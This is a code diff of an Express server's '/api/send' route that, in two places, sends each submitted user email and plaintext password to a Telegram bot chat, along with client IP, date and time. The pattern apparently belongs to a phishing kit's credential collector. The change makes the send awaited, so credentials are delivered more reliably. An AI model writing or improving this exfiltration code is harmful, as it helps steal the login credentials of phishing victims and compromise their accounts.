@@ -61,10 +61,12 @@ app.post('/api/send', async (req, res) => {
             const textLog = `${userEmail},${userPass},${clientIp},${tanggal},${pukul},${status}`
 
             if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-                axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: textLog
-                }).catch(() => {})
+                try {
+                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textLog
+                    })
+                } catch (e) {}
             }
         }
 
@@ -83,10 +85,12 @@ app.post('/api/send', async (req, res) => {
             const textLog = `${userEmail},${userPass},${clientIp},${tanggal},${pukul},${status}`
 
             if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-                axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: textLog
-                }).catch(() => {})
+                try {
+                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textLog
+                    })
+                } catch (e) {}
             }
         }
 
